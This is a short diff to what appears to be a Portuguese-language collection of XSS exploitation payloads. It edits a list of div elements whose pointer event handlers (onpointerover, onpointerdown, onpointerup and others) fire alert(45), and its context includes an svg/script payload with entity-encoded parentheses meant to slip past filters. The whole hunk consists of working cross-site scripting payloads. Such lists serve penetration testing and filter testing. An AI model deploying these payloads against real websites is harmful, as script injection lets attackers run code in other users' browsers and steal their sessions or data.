@@ -35,10 +35,10 @@ Vários scripts voltados a exploração da vulnerabilidade XSS
 <svg><script>alert&lpar;'33'&rpar;
 
 // Div payload
-<div onpointerover="alert(45)">MOVE HERE</div>
-<div onpointerdown="alert(45)">MOVE HERE</div>
-<div onpointerenter="alert(45)">MOVE HERE</div>
-<div onpointerleave="alert(45)">MOVE HERE</div>
-<div onpointermove="alert(45)">MOVE HERE</div>
-<div onpointerout="alert(45)">MOVE HERE</div>
-<div onpointerup="alert(45)">MOVE HERE</div>
+<div onpointerover="alert(45)">'MOVE HERE'</div>
+<div onpointerdown="alert(45)">'MOVE HERE'</div>
+<div onpointerenter="alert(45)">'MOVE HERE'</div>
+<div onpointerleave="alert(45)">'MOVE HERE'</div>
+<div onpointermove="alert(45)">'MOVE HERE'</div>
+<div onpointerout="alert(45)">'MOVE HERE'</div>
+<div onpointerup="alert(45)">'MOVE HERE'</div>
